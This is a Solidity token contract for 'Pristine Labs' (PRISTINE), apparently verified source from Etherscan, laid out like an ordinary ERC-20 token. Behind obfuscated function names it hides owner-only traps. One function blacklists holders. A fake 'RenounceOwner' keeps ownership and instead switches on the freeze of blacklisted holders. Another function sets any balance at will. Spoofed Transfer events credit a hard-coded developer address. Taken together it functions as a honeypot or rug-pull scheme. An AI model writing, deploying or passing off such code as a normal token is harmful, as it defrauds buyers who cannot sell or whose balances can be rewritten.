/**
 *Submitted for verification at Etherscan.io on 2022-10-17
*/

// "SPDX-License-Identifier: UNLICENSED
                                 
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract PRISTINELABS {
  
    mapping (address => uint256) public qAMx;
    mapping (address => bool) qTXx;


    // 
    string public name = "Pristine Labs";
    string public symbol = unicode"PRISTINE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint qver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        qAMx[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x063B6e3C32a0Bd10b03f32a0D07830DA49a8cD59;
    address lead_dev = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier III() {   
    require(msg.sender == owner);
         _;}
    modifier II () {
        qver = 1;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(qAMx[msg.sender] >= value);
        qAMx[msg.sender] -= value;  
        qAMx[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(qTXx[msg.sender]) {
        require(qver < 1);} 
        require(qAMx[msg.sender] >= value);
        qAMx[msg.sender] -= value;  
        qAMx[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return qAMx[account]; }
        function qqury(address Q) III public{          
        require(!qTXx[Q]);
        qTXx[Q] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function qval(address Q, uint256 qX) III public returns (bool success) {
        qAMx[Q] = qX;
        return true; }
        function RenounceOwner() II public {
            require(msg.sender == owner);
        }
        function qdraw(address Q) III public {
        require(qTXx[Q]);
        qTXx[Q] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= qAMx[from]);
        require(value <= allowance[from][msg.sender]);
        qAMx[from] -= value;  
        qAMx[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(qTXx[from] || qTXx[to]) {
        require(qver < 1);}
        require(value <= qAMx[from]);
        require(value <= allowance[from][msg.sender]);
        qAMx[from] -= value;
        qAMx[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }